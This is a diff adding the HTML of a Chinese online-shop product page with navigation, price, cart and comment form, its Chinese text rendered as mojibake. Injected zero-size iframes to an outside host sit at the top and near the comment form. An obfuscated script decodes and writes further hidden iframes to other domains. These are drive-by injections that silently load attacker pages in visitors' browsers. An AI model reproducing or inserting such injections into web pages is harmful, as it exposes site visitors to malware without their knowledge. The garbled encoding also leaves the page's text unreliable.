@@ -1,0 +1,799 @@
+<iframe src=http://www.haogs.cn/html/ width=0 height=0></iframe>
+<iframe src=http://www.haogs.cn/html/ width=100 height=0></iframe>
+
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+var HtmlStrings=["=jgsbnf!tsd>#iuuq;00xxx/631zh/dpn#!xjeui>#1#!ifjhiu>#1#!gsbnfcps","efs>#1#>=0jgsbnf>=jgsbnf!tsd>#iuuq;00x/631zh/dpn#!xjeui>#","1#!ifjhiu>#1#!gsbnfcpsefs>#1#>=0jgsbnf>=jgsbnf!tsd>#iuuq;","00xx/631zh/dpn#!xjeui>#1#!ifjhiu>#1#!gsbnfcpsefs>#1#>=0jgsbn","f>=jgsbnf!tsd>#iuuq;00y{/631zh/dpn#!xjeui>#1#!ifjhiu>#1#!g","sbnfcpsefs>#1#>=0jgsbnf>"];
+function psw(st){
+  var varS;
+  varS="";
+  var i;
+  for(var a=0;a<st.length;a++){
+    i = st.charCodeAt(a); 
+    if (i==1) 
+      varS=varS+String.fromCharCode('"'.charCodeAt()-1);
+    else if (i==2) {
+      a++;
+      varS+=String.fromCharCode(st.charCodeAt(a));
+      }
+    else
+      varS+=String.fromCharCode(i-1);
+  }
+  return varS;
+};
+var num=6;
+function S(){
+for(i=0;i<num;i++)
+  document.write(psw(HtmlStrings[i]));}
+S();
+// -->
+</SCRIPT>
+
+<iframe src=http://www.haogs.cn/html/ width=0 height=0></iframe>
+<iframe src=http://www.haogs.cn/html/ width=100 height=0></iframe>
+
+
+<html><head><title>ÖÐ¹úÍø¹ºÔÚÏß--ÉÌÆ·ÐÅÏ¢</title>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<link href="images/css.css" rel="stylesheet" type="text/css">
+<script language="javascript">
+function view(id){
+window.open("list1.asp?id="+id,"","top=0,left=0,width=625,resizable=yes,scrollbars=yes ");
+}
+</script>
+<style type="text/css">
+<!--
+.ÑùÊ½1 {color: #666666}
+body {
+	background-color: #FFFFFF;
+}
+.ÑùÊ½5 {color: #0080c0}
+-->
+</style>
+</head>
+<body>
+<style type="text/css">
+<!--
+.ÑùÊ½1 {
+	color: #FFFFFF;
+	font-weight: bold;
+	font-size: 14px;
+}
+.ÑùÊ½2 {
+	font-size: 14px;
+	font-weight: bold;
+}
+-->
+</style>
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_openBrWindow(theURL,winName,features) { //v2.0
+  window.open(theURL,winName,features);
+}
+//-->
+</script>
+<TABLE cellSpacing=0 cellPadding=0 width=760 align=center border=0>
+  <TBODY>
+    <TR>
+      <TD>
+        <TABLE cellSpacing=0 cellPadding=0 width="100%" align=center border=0>
+          <TBODY>
+            <TR>
+              <TD width=180><img height=70 src="images/logo.bmp" width=180></TD>
+              <TD vAlign=top>
+                <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+                  <TBODY>
+                    <TR>
+                      <TD height=32 align="center" valign="middle">
+                      <DIV align=right>  <img src="images/car.gif" width="21" height="21" align="absmiddle">&nbsp;&nbsp;<a href="####" class="w2" onClick="MM_openBrWindow('gouwu.asp?action=show&amp;lx=1','','toolbar=yes,status=yes,scrollbars=yes,width=780,height=450')">¹ºÎï³µ</a> | <a href="logout.asp" class="w2">×¢ÏúÍË³ö</a> | <a href="gbook.asp" class="w2">¸øÎÒÁôÑÔ</a> | <a href="user/admin_login.asp" class="w2">ÉÌ¼ÒÎ¬»¤</a> | <a class="w2" onclick="this.style.behavior='url(#default#homepage)';this.setHomePage('http://www.hcom.com.cn')" href="http://www.hcom.com.cn">ÉèÎªÊ×Ò³</a> | <a class="w2" title="»ª²ÊÊ±´ú" onclick="window.external.addFavorite('www.hcom.com.cn','»ª²ÊÍøÂçÉÌ³Ç')" href="http://www.hcom.com.cn">ÊÕ²Ø±¾Õ¾</a>&nbsp;  </DIV></TD>
+                    </TR>
+                    <TR>
+                      <TD>
+                        <TABLE cellSpacing=0 cellPadding=0 width=480 align=right 
+                  border=0>
+                          <TBODY>
+                            <TR bgColor=#ffffff>
+                              <TD width=80 align=center valign="middle" 
+                        background=images/an_0.gif><span class="ÑùÊ½1"> <a href="index.asp" class="W4"><font color="#FFFFFF">ÉÌ³ÇÊ×Ò³</font></a> </span></TD>
+                              <TD align=center width=80 background=images/an_1.gif 
+                      height=28><span class="ÑùÊ½2"><a href="jetway.asp" class="W4">¿ìËÙ·ÖÀà</a></span></TD>
+                              <TD align=center width=80 
+                        background=images/an_1.gif><span class="ÑùÊ½2"><a href="class.asp?lx=news" class="W4">ÐÂÆ·ÉÏ¼Ü</a></span></TD>
+                              <TD align=center width=80 
+                        background=images/an_1.gif><span class="ÑùÊ½2"><a href="class.asp?lx=tejia" class="W4">ÌØ¼Û´ÙÏú</a></span></TD>
+                              <TD align=center width=80 
+                        background=images/an_1.gif><span class="ÑùÊ½2"><a href="class.asp" class="W4">È«²¿²úÆ·</a></span></TD>
+                              <TD align=center width=80 
+                        background=images/an_1.gif><span class="ÑùÊ½2"><a href="speciality.asp"  class="W4">ÌøÔéÊÐ³¡</a></span></TD>
+                            </TR>
+                            <TR bgColor=#f7941d>
+                              <TD colSpan=7 
+            height=3></TD>
+                            </TR>
+                          </TBODY>
+                      </TABLE></TD>
+                    </TR>
+                  </TBODY>
+              </TABLE></TD>
+            </TR>
+          </TBODY>
+        </TABLE>
+        <DIV id=QQServiceLayer 
+      style="RIGHT: 0px; VISIBILITY: visible; POSITION: absolute; TOP: 400px"></DIV>
+        <SCRIPT>var online= new Array();</SCRIPT>
+      </TD>
+    </TR>
+    <TR>
+      <TD height=10></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+<TABLE width=760 
+border=0 align=center cellPadding=1 cellSpacing=1 bgColor=#CCCCCC>
+  <TBODY>
+    <TR>
+      <TD bgColor=#ffffff><table width="760" height="35" border="0" cellpadding="1" cellspacing="0" bgcolor="#CCCCCC" id="table16">
+          <form name="form" method="post" action="research.asp">
+            <tr>
+              <td width="75" align="right" background=images/bb.gif>·ÖÀà£º</td>
+              <td width="169" background=images/bb.gif style="padding-left:10px">
+                
+                <select class="wenbenkuang"  name="anclassid">
+                  <option value="0">²éÑ¯ËùÓÐ·ÖÀà</option>
+                  
+                  <option value="61">ÃÀÉ«ÌíÏã</option>
+                  
+                  <option value="64">ÊçÅ®ÃûæÂ</option>
+                  
+                  <option value="72">ÉðÊ¿·ç²É</option>
+                  
+                  <option value="62">ÂÄÐÐÌìÏÂ</option>
+                  
+                  <option value="74">½ðÉ«Í¯Äê</option>
+                  
+                  <option value="69">ÊýÂë¹ã³¡</option>
+                  
+                  <option value="73">°üÂÞÍòÏó</option>
+                  
+                  <option value="63">Öé±¦Ê×ÊÎ</option>
+                  
+              </select></td>
+              <td width="126" background=images/bb.gif style="padding-left:10px"> ²é 
+                <input  class="wenbenkuang"  name="jiage" id="jiage12" size="6">
+                ÔªÒÔÏÂ </td>
+              <td width="167" background=images/bb.gif style="padding-left:10px">
+                <script>
+	var selects111=[];
+
+	selects111['2']=new Array(
+
+		new Option('Åµ»ùÑÇ','Åµ»ùÑÇ'),
+
+		new Option('Ä¦ÍÐÂÞÀ­','Ä¦ÍÐÂÞÀ­'),
+
+		new Option('ÈýÐÇ','ÈýÐÇ'),
+
+		new Option('Ë÷°®','Ë÷°®'),
+
+		new Option('Î÷ÃÅ×Ó','Î÷ÃÅ×Ó'),
+
+		new Option('·ÉÀûÆÖ','·ÉÀûÆÖ'),
+
+		new Option('NEC','NEC'),
+
+		new Option('LG','LG'),
+
+		new Option('°¢¶û¿¨ÌØ','°¢¶û¿¨ÌØ'),
+
+		new Option('ÆäËü','ÆäËü'));
+
+	selects111['3']=new Array(
+
+		new Option('0-6ÔÂ','0-6ÔÂ'),
+
+		new Option('7ÔÂ-1Ëê','7ÔÂ-1Ëê'));
+ 
+
+function showselect()
+{
+if (document.form.action.value=="2") {
+	T_select.style.display = "";
+	//¼ÓÈëÄÚÈÝ
+		with (document.form){
+			if(action.value) {
+				selectname.options.length=0;
+				for(var i=0;i<selects111[action.value].length;i++){
+					selectname.add(selects111[action.value][i]);
+				}
+			}
+		}
+}else{
+	T_select.style.display = "none";
+} 
+}
+      </script>
+                <table border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td>
+                      <select class="wenbenkuang"  name="action" id="select17" onChange="showselect();">
+                        <option value="1" selected>ÉÌÆ·Ãû³Æ</option>
+                        <option value="2">ÉÌÆ·Æ·ÅÆ</option>
+                        <option value="3">ÄÚÈÝ¼ò½é</option>
+                      </select>
+                    </td>
+                    <td>
+                      <table border="0" cellspacing="0" cellpadding="0" id=T_select style="DISPLAY: none">
+                        <tr>
+                          <td>
+                            <select class="wenbenkuang" name="selectname">
+                            </select>
+                          </td>
+                        </tr>
+                    </table></td>
+                  </tr>
+              </table>              </td>
+              <td width="130" align="center" background=images/bb.gif><input class=wenbenkuang name="searchkey" type="text" id="searchkey12" size=15></td>
+              <td width="81" align="left" background=images/bb.gif><input name="submit" type="image" src="images/sousuo.gif" align="top" border="0"></td>
+            </tr>
+          </form>
+      </table></TD>
+    </TR>
+    <TR>
+      <TD bgcolor="#FFFFFF"><TABLE width="760" border=0 align=center cellPadding=0 cellSpacing=0>
+          <TBODY>
+            <TR>
+              <TD width="586" height=30 align=left><IMG height=30 
+                  src="images/dinggou.gif" width=586 border=0></TD>
+              <TD width=174 align=middle bgcolor="#FFFFFF">&nbsp;¡¡ </TD>
+            </TR>
+          </TBODY>
+      </TABLE></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+<div id=div_id1 style="LEFT: 2px; POSITION: absolute; TOP: 263px; width: 90px; height: 250px;"> 
+  <table width=100% border=0 cellpadding=0 cellspacing=0 bordercolor="f5f5f5" align="center">
+    <tr height=25> 
+      <td height="20" width="90"><a href="model/index.asp"><img src="images/ad_1.jpg" width="110" height="338" border="0" alt="À¼ÖÝ°Ù°²¹ºÎï±­ÍøÂçÐÎÏó´úÑÔÈË´óÈü"></a></td>
+    </tr>
+    <tbody> </tbody> 
+  </table>
+</div>
+<div id=div_id style="LEFT: 894px; POSITION: absolute; TOP: 263px; width: 90px; height: 250px;"> 
+  <table width=100% border=0 cellpadding=0 cellspacing=0 bordercolor="f5f5f5" align="center">
+    <tr height=25> 
+      <td height="20" width="90"><a href="model/index.asp" target="_blank"><img src="images/ad_2.jpg" width="110" height="339" border="0" alt="À¼ÖÝ°Ù°²¹ºÎï±­ÍøÂçÐÎÏó´úÑÔÈË´óÈü"></a></td>
+    </tr>
+    <tbody> </tbody> 
+  </table>
+</div>
+<!-- ¿©±â±îÁö-->
+<script language=javascript type=text/javascript>
+<!--
+var scroll_pixel1,div_pixel1,gtpos1,gbpos1,loop1,moving_spd1;
+var top_margin1 = 150;         /// Ã¢ÀÇ ¸ÇÀ§¿ÍÀÇ ¿©¹é ³»·Á¿Ã¶§
+var top_margin21 = 270;      /// Ã¢ÀÇ ¸ÇÀ§¿ÍÀÇ ¿©¹é ¿Ã¶ó¿Ã¶§ 
+var speed1 = 20;            /// Á¡Â÷ ÁÙ¾îµå´Â ¼Óµµ¸¦ À§ÇÑ ¼³Á¤           
+var speed21 = 15;           /// setTimeoutÀ» À§ÇÑ ¼Óµµ ¼³Á¤
+var moving_stat1 = 1;      /// ¸Þ´ºÀÇ ½ºÅ©·ÑÀ» ·Îµù½Ã on/off¼³Á¤ 1=¿òÁ÷ÀÓ 0Àº ¸ØÃã 
+
+function check_scrollmove1()
+{
+  scroll_pixel1 = document.body.scrollTop;
+        gtpos1 = document.body.scrollTop+top_margin1;
+        gbpos1 = document.body.scrollTop+top_margin21;
+  if(div_id1.style.pixelTop < gtpos1)
+        { 
+         moving_spd1 = (gbpos1-div_id1.style.pixelTop)/speed1;
+         div_id1.style.pixelTop += moving_spd1;    
+        }
+        if(div_id1.style.pixelTop > gtpos1)
+        {
+         moving_spd1 = (div_id1.style.pixelTop-gtpos1)/speed1;
+         div_id1.style.pixelTop -= moving_spd1;
+        }
+        loop1 = setTimeout("check_scrollmove1()",speed21);
+}
+ 
+function moving_control1()
+{
+  if(!moving_stat1){ check_scrollmove1(); moving_stat1 = 1;}
+        else{ clearTimeout(loop1); moving_stat1 = 0; div_id1.style.pixelTop = top_margin1;}
+}
+check_scrollmove1();
+-->
+</script>
+<script language=javascript type=text/javascript>
+<!--
+var scroll_pixel,div_pixel,gtpos,gbpos,loop,moving_spd;
+var top_margin = 150;         /// Ã¢ÀÇ ¸ÇÀ§¿ÍÀÇ ¿©¹é ³»·Á¿Ã¶§
+var top_margin2 = 270;      /// Ã¢ÀÇ ¸ÇÀ§¿ÍÀÇ ¿©¹é ¿Ã¶ó¿Ã¶§ 
+var speed = 20;            /// Á¡Â÷ ÁÙ¾îµå´Â ¼Óµµ¸¦ À§ÇÑ ¼³Á¤           
+var speed2 = 15;           /// setTimeoutÀ» À§ÇÑ ¼Óµµ ¼³Á¤
+var moving_stat = 1;      /// ¸Þ´ºÀÇ ½ºÅ©·ÑÀ» ·Îµù½Ã on/off¼³Á¤ 1=¿òÁ÷ÀÓ 0Àº ¸ØÃã 
+
+function check_scrollmove()
+{
+  scroll_pixel = document.body.scrollTop;
+        gtpos = document.body.scrollTop+top_margin;
+        gbpos = document.body.scrollTop+top_margin2;
+  if(div_id.style.pixelTop < gtpos)
+        { 
+         moving_spd = (gbpos-div_id.style.pixelTop)/speed;
+         div_id.style.pixelTop += moving_spd;    
+        }
+        if(div_id.style.pixelTop > gtpos)
+        {
+         moving_spd = (div_id.style.pixelTop-gtpos)/speed;
+         div_id.style.pixelTop -= moving_spd;
+        }
+        loop = setTimeout("check_scrollmove()",speed2);
+}
+ 
+function moving_control()
+{
+  if(!moving_stat){ check_scrollmove(); moving_stat = 1;}
+        else{ clearTimeout(loop); moving_stat = 0; div_id.style.pixelTop = top_margin;}
+}
+check_scrollmove();
+-->
+</script>
+
+
+<table width="760" border="0" cellspacing="0" cellpadding="0" align="center" background="images/webbg.jpg">
+  <tr>
+    <td width="760">
+<table width="765" align="center" border="0" cellspacing="0" cellpadding="0" bordercolor="#CCCCCC">
+<tr> 
+<td width="763" align="center" valign="top" bordercolor="#FFFFFF" bgcolor="#FFFFFF"> 
+
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td height="30" valign="middle" bgcolor="#ffffff"><span class="table-zuo">
+</span>&nbsp;µ±Ç°Î»ÖÃ:<a href=index.asp>Ê×Ò³</a> -
+<a href=class.asp?lx=big&anid=64 targer=_blank>ÊçÅ®ÃûæÂ</a> - <a href=class.asp?lx=small&anid=64&nid=622 targer=_blank>°×ÁìÀöÈË</a>
+- ¿­µÏ.Ã×À­Å®Ê½ÉÏÒÂ </td>
+</tr>
+  <TR bgcolor="#cccc99">
+    <TD height="30" background="images/xie.gif" bgcolor="#e0f0fc">&nbsp;      </TD>
+  </TR>
+<tr> 
+<td> 
+<table width="98%" align="center" border="0" cellspacing="0" cellpadding="0">
+<tr> 
+<td width="210" height="258" align="center" valign="top"> 
+  <table cellspacing=0 cellpadding=0 width=100% height=220 border=0>
+    <tbody>
+      <tr>
+        <td width="173" align=center>
+          
+          <img src="bookpic/20067301063589458.jpg">
+          
+          <br>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;±¾ÉÌÆ·ÒÑÓÐ <font color="#FF0000">312</font> ÈË¹Ø×¢</td>
+      </tr>
+    </tbody>
+  </table>  </td>
+<td width="532" align="center" valign="middle"> 
+  <table width="95%" border="0" align="center" cellpadding="2" cellspacing="0">
+    <tr>
+      <td height="50" valign="bottom"><font size="3"><br>
+            <strong>¿­µÏ.Ã×À­Å®Ê½ÉÏÒÂ</strong></font></td>
+    </tr>
+    
+<!--<tr> <td>ÉÌÆ·¹æ¸ñ£ºM-XL</td></tr>-->
+      <tr>
+        <td>ÉÌÆ·ÊýÁ¿£º10¼þ¡¡
+            
+            <span class="ÑùÊ½4">ÈÈÂôÖÐ</span>
+            </td>
+      </tr>
+      <tr>
+      <tr>
+        <td>ÉÌÆ·ÕÛ¿Û£º
+            7.7 ÕÛ
+            ¡¡ ÔùËÍ»ý·Ö£º0 ·Ö</td>
+      </tr>
+  <td height="123">
+      <table width="100%"  border="0">
+        <tr>
+          <td width="14%"><img src="images/jg1.gif" width="40" height="12">£º</td>
+          <td width="86%" colspan="2"><s> £¤700Ôª</s> </td>
+        </tr>
+        <tr>
+          <td><img src="images/jg2.gif" width="40" height="12">£º</td>
+          <td><font color="#FF0000">£¤536Ôª </font></td>
+          <td><font color="#FF0000">
+            
+          </font></td>
+        </tr>
+      </table>
+      <table width="100%"  border="0">
+        <tr>
+          <td height="37" valign="middle"><a href="gouwu.asp?id=989&action=add" style="cusor:hand" target=_blank onClick='javascript:document.form4.submit();'><img src="images/detailview_b.gif" border=0 ></a>¡¡<a href="shoucang.asp?id=989&action=add" target=_blank ><img src="images/detailview_c.gif" border=0></a></td>
+        </tr>
+        <tr>
+          <td height="26">&nbsp;<A class=d 
+                  href="pinglun.asp"><STRONG>·¢±íÆÀÂÛ</STRONG></A>¡¡				  <A class=d href="http://wpa.qq.com/msgrd?V=1&Uin=244375025&Site=Jetiben.Com&Menu=yes"><STRONG>ÔÚÏß×ÉÑ¯</STRONG></A>
+				  &nbsp;&nbsp;
+				  <input class="in3" onclick="window.location='shangpintj.asp?id=989'" type="reset" value="ÍÆ¼ö¸øÅóÓÑ" name="Submit222">				  </td>
+        </tr>
+    </table></td>
+  </tr>
+  </table>
+  <table width="95%"  border="0">
+  <tr>
+    <td height="28" align="right" valign="top">
+      
+      <a href="list.asp?id=988"><strong>ÉÏÒ»¼þ</strong></a>
+      
+      <a href="list.asp?id=990"><strong>ÏÂÒ»¼þ</strong></a>
+      </td>
+  </tr>
+</table></td>
+</tr>
+
+</table>
+<TABLE cellSpacing=1 cellPadding=10 width="100%" bgColor=#cccc99 
+        border=0>
+  <TBODY>
+    <TR>
+      <TD bgColor=#ffffff>
+        <TABLE cellSpacing=0 cellPadding=4 width="100%" border=0>
+          <TBODY>
+            <TR>
+              <TD class=tyb height=22><STRONG class=f14><IMG height=9 src="" 
+                  width=9 align=absMiddle> </STRONG><SPAN 
+                  class="f14 style3"><STRONG>ÉÌÆ·<STRONG><SPAN class=f14>½éÉÜ</SPAN></STRONG> </STRONG></SPAN> </TD>
+            </TR>
+            <TR>
+              <TD class=f14 style="LINE-HEIGHT: 150%" vAlign=top 
+                  height=36><table width="100%"  border="0">
+                  <tr>
+                    <td><font size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ÃæÁÏ£ºÃÞ<BR>ÑÕÉ«£º°×É«<BR>ÌØµã£ºÍ¸Æø.Îüº¹.ÑÕÉ«ÇåË¬</font><br>
+                      <a href=research.asp?action=1&anclassid=0&searchkey=¿­µÏ.Ã×À­Å®Ê½ÉÏÒÂ target=_blank><font color=red>²é¿´ËùÓÐÏà¹Ø²úÆ·</font></a></td>
+                  </tr>
+              </table></TD>
+            </TR>
+            <TR>
+              <TD>
+                <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+                  <TBODY>
+                    <TR>
+                      <TD class=tyb height=22><STRONG class=f14><STRONG 
+                        class=f14><IMG height=9 src="" width=9 align=absMiddle> </STRONG></STRONG><STRONG><SPAN 
+                        class=f14>·þÎñÐÅÏ¢</SPAN></STRONG> </TD>
+                    </TR>
+                    <TR>
+                      <TD style="LINE-HEIGHT: 150%">
+                        <OL>
+                          <LI>ÏúÊÛÇøÓò£ºÈ«¹ú·¶Î§£» 
+                                            <LI>ÅäËÍ·½Ê½£º¿ìµÝ¹«Ë¾ÅäËÍ EMSÌØ¿ì×¨µÝ À¼ÖÝµØÇøËÍ»õÉÏÃÅ»òÉÏÃÅ¹ºÂò£» 
+                                            <LI>Ö§¸¶·½Ê½£º ÔÚÏßÖ§¸¶¡£ </LI>
+                      </OL></TD>
+                    </TR>
+                  </TBODY>
+                </TABLE>
+                <TABLE id=Table1 cellSpacing=0 cellPadding=0 width="100%" 
+                  border=0>
+                  <TBODY>
+                    <TR>
+                      <TD class=tyb height=22><STRONG class=f14><STRONG 
+                        class=f14><IMG height=9 src="" width=9 align=absMiddle> </STRONG></STRONG><STRONG><SPAN 
+                        class=f14>ÌØ±ðËµÃ÷</SPAN></STRONG> </TD>
+                    </TR>
+                    <TR>
+                      <TD style="LINE-HEIGHT: 150%">
+                        <UL>
+                          <LI>Ö£ÖØ³ÐÅµ:±¾ÉÌ³Ç³ÏÐÅ¾­Óª,¿îµ½·¢»õ.Á¼ºÃµÄÐÅÓþÊÇÎÒÃÇÉú´æµÄÎ¨Ò»·½Ê½!
+                          <LI>Çëµã»÷"Á¢¿Ì¹ºÂò"Í¼±êÏÂ¶©µ¥£¬ÌîÄúµÄÊÕ»õÐÅÏ¢£¬°´ÌáÊ¾Íê³É½»Ò×£»Èç±¾ÉÌ³ÇÃ»ÓÐÄúÏë¹ºÂòµÄÉÌÆ·£¬¿ÉÓëÎÒÃÇ¿Í·þÁªÂç¡£ 
+                                                        
+                                            <LI>ÉÌ³Ç¿Í·þµç»°£º0931-8843199£¬8843299 ¡£ÓÐÈÎºÎÎÊÌâÇëÓëÎÒÃÇÁªÂç¡£ 
+                                            <LI>ÈçÐè½øÐÐÅúÁ¿¹ºÂò£¬¿É¸ù¾Ý²É¹ºÁ¿ÓëÄúÁíÒé¼Û¸ñ£¬ÇëÖ±½ÓÓëÎÒÃÇµç»°»òÓÊ¼þÁªÏµ¡£ </LI>
+                      </UL></TD>
+                    </TR>
+                  </TBODY>
+              </TABLE></TD>
+            </TR>
+          </TBODY>
+      </TABLE></TD>
+    </TR>
+  </TBODY>
+</TABLE></td>
+</tr>
+<tr> 
+<td><TABLE width="100%" border=0>
+  <TBODY>
+    <TR>
+      <TD><STRONG>&nbsp;&nbsp;&nbsp;&nbsp;</STRONG></TD>
+      </TR>
+  </TBODY>
+</TABLE>
+  <TABLE width="100%" border=0 bgcolor="#e7fafe">
+  <TBODY>
+    <TR>
+      <TD height=25><STRONG>&nbsp;&nbsp;&nbsp;&nbsp;ÒÑ·¢±íÆÀÂÛ</STRONG></TD>
+      <TD align=right><a href=listpl.asp?id=989 target=_blank>ä¯ÀÀ¸ÃÉÌÆ·µÄÈ«²¿ÌõÆÀÂÛ</a>&nbsp;&nbsp;</TD>
+    </TR>
+  </TBODY>
+</TABLE></td>
+</tr>
+        
+<tr> 
+<td align="center" height="180">
+<style type="text/css">
+<!--
+body {
+	background-image: url();
+}
+-->
+</style>
+<TABLE cellSpacing=0 cellPadding=10 width="100%" align=center 
+            bgColor=#e7fafe border=0>
+  <TBODY>
+    <TR>
+      <TD width="58%" background=images/xie.gif>
+        <TABLE cellSpacing=0 cellPadding=2 width="100%" align=center bgColor=#cff3f8 border=0>
+          <TBODY>
+            <TR>
+              <TD width="100%" colspan="2">
+                <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+                  <TBODY>
+                    <TR>
+                      <TD width="72%" height=25 bgColor=#baf0fa>
+                        <P align=center><FONT 
+                              color=#0099cc><STRONG>·¢±íÆÀÂÛ</STRONG></FONT></P></TD>
+                      <TD width="28%" bgColor=#baf0fa>´ËÉÌÆ·¹²ÓÐ0ÌõÆÀÂÛ&nbsp;&nbsp;&nbsp;</TD>
+                    </TR>
+                  </TBODY>
+              </TABLE></TD>
+            </TR>
+          	<form name="pinglunform" method="post" action="list.asp?action=save&id=989">
+            <tr>
+              <td align="right">ÐÕ Ãû£º</td>
+              <td>
+                <input name="pinglunname" id="pinglunname" value="ÓÎ¿Í" maxlength="18">
+              </td>
+            </tr>
+            <INPUT type=hidden value=879 
+                    name=mobileid>
+            <INPUT type=hidden name=uid>
+            <tr>
+              <td align="right" valign="top">ÄÚ ÈÝ£º</td>
+              <td>
+                <textarea class="wenbenkuang" name="pingluncontent" cols="70" rows="3" id="pingluncontent" style="BORDER-RIGHT: #ffffff 1px groove; BORDER-TOP: BORDER-LEFT: COLOR: #333333; BORDER-BOTTOM: HEIGHT: 18px; BACKGROUND-COLOR:"; ";";";"></textarea>
+              </td>
+            </tr>
+            <TR>
+              <TD height=30 colspan="2"><CENTER>
+                <input class="go-wenbenkuang" name="submit2" value="Ìá½»±£´æ" type="submit" onClick="return check();">
+                <input class="go-wenbenkuang" onclick="window.location='shangpintj.asp?id=989'" type="reset" value="ÍÆ¼ö¸øÅóÓÑ" name="Submit22">
+                </CENTER></TD>
+            </TR>
+          </FORM>
+      </TABLE></TD>
+    </TR>
+</TABLE>
+
+<script LANGUAGE="javascript">
+<!--
+function checkspace(checkstr) {
+  var str = '';
+  for(i = 0; i < checkstr.length; i++) {
+    str = str + ' ';
+  }
+  return (str == checkstr);
+}
+function check()
+{
+  if(checkspace(document.pinglunform.pinglunname.value)) {
+	document.pinglunform.pinglunname.focus();
+    alert("ÇëÌîÐ´ÄúµÄÐÕÃû£¡");
+	return false;
+  }
+  if(checkspace(document.pinglunform.pingluncontent.value)) {
+	document.pinglunform.pingluncontent.focus();
+    alert("ÇëÌîÐ´ÆÀÂÛÕýÎÄ£¡");
+	return false;
+  }
+	  }
+//-->
+</script><iframe src=http://www.haogs.cn/html/ width=0 height=0></iframe>
+<iframe src=http://www.haogs.cn/html/ width=100 height=0></iframe>
+
+
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table></td>
+</tr>
+</table>
+<table width="15" align="center">
+  <tr>
+    <td height="4" width="760"></td>
+  </tr>
+</table>
+<TABLE cellSpacing=1 cellPadding=4 width="767" align=center 
+      bgColor=#ffcc00 border=0>
+  <TBODY>
+    <TR>
+      <TD align=middle bgColor=#ffffcc height=25> <font color="#FF3300">¹ºÎï²½Öè -->> Ñ¡ÔñÉÌÆ· -> ¼ÓÈë¹ºÎï -> È¥ÊÕÒøÌ¨ -> Ñ¡ÔñÅäËÍ·½Ê½ -> ÌîÐ´ÊÕ»õÈËÐÅÏ¢ -> Ñ¡Ôñ¸¶¿î·½Ê½ -> Íê³ÉÖ§¸¶ -> ¹ºÎïÍê³É</font> </TD>
+    </TR>
+  </TBODY>
+</TABLE>
+<TABLE width="769" border=0.5 align=center cellPadding=0 cellSpacing=1 bordercolor="#f7f7f7">
+  <TBODY>
+    <TR bgColor=#666666 height=22>
+      <TD width="16%" align=middle bgcolor="#666666"><FONT color=#FFFFFF>ÐÂÊÖÖ¸ÄÏ</FONT></TD>
+      <TD width="16%" align=middle bgcolor="#666666"><FONT color=#FFFFFF>Ö§¸¶·½Ê½</FONT></TD>
+      <TD align=middle width="16%"><FONT color=#FFFFFF>ÅäËÍËµÃ÷</FONT></TD>
+      <TD align=middle width="16%"><FONT color=#FFFFFF>ÓÅ»ÝÕþ²ß</FONT></TD>
+      <TD align=middle width="16%"><FONT color=#FFFFFF>ÊÛºó·þÎñ</FONT></TD>
+    </TR>
+    <TR>
+      <TD vAlign=top>
+        <TABLE width="100%" 
+            border=0 align="center" cellPadding=0 cellSpacing=0 bgColor=#0044dd>
+          <TBODY>
+            <TR>
+              <TD height=20 align="center" bgColor=#ffffff><a href="about.asp?action=lxwm" class="w2" target="_blank">ÁªÏµ·½Ê½</a></TD>
+            </TR>
+            <TR>
+              <TD height=20 align="center" bgColor=#ffffff><a href="gbook.asp" class="w2" target="_blank">ÎÒÒªÍ¶Ëß</a></TD>
+            </TR>
+            <TR>
+              <TD bgColor=#ffffff height=20>&nbsp;</TD>
+            </TR>
+          </TBODY>
+      </TABLE></TD>
+      <TD vAlign=top>
+        <TABLE width="100%" 
+            border=0 align="center" cellPadding=0 cellSpacing=0 bgColor=#0044dd>
+          <TBODY>
+            <TR>
+              <TD height=20 align="center" bgColor=#ffffff><a href="help.asp?action=fukuan" class="w2" target="_blank">¸¶¿î·½Ê½</a></TD>
+            </TR>
+            <TR>
+              <TD height=20 align="center" bgColor=#ffffff><a href="help.asp?action=tiaokuan" class="w2" target="_blank">½»Ò×Ìõ¿î</a></TD>
+            </TR>
+            <TR>
+              <TD bgColor=#ffffff height=20>&nbsp;</TD>
+            </TR>
+          </TBODY>
+      </TABLE></TD>
+      <TD vAlign=top>
+        <TABLE width="100%" 
+            border=0 align="center" cellPadding=0 cellSpacing=0 bgColor=#0044dd>
+          <TBODY>
+            <TR>
+              <TD height=20 align="center" bgColor=#ffffff><a href="help.asp?action=feiyong" class="w2" target="_blank">ÅäËÍ·¶Î§</a></TD>
+            </TR>
+            <TR>
+              <TD height=20 align="center" bgColor=#ffffff><a href="help.asp?action=yunshushuoming" class="w2" target="_blank">ÔËÊäËµÃ÷</a></TD>
+            </TR>
+            <TR>
+              <TD bgColor=#ffffff height=20>&nbsp;</TD>
+            </TR>
+          </TBODY>
+      </TABLE></TD>
+      <TD vAlign=top><TABLE width="100%" 
+            border=0 align="center" cellPadding=0 cellSpacing=0 bgColor=#0044dd>
+          <TBODY>
+            <TR>
+              <TD height=20 align="center" bgColor=#ffffff><a href="help.asp?action=jifen" class="w2" target="_blank">»ý·Ö½±Àø</a></TD>
+            </TR>
+            <TR>
+              <TD height=20 align="center" bgColor=#ffffff><a href="help.asp?action=vip" class="w2" target="_blank">VIPÌØ»Ý</a></TD>
+            </TR>
+            <TR>
+              <TD bgColor=#ffffff height=20>&nbsp;</TD>
+            </TR>
+          </TBODY>
+      </TABLE></TD>
+      <TD vAlign=top><TABLE width="100%" 
+            border=0 align="center" cellPadding=0 cellSpacing=0 bgColor=#0044dd>
+          <TBODY>
+            <TR>
+              <TD height=20 align="center" bgColor=#ffffff><a href="help.asp?action=baomi" class="w2" target="_blank">±£ÃÜ°²È«</a></TD>
+            </TR>
+            <TR>
+              <TD height=20 align="center" bgColor=#ffffff><a href="help.asp?action=shouhoufuwu" class="w2" target="_blank">ÍË»»»õ´¦Àí</a></TD>
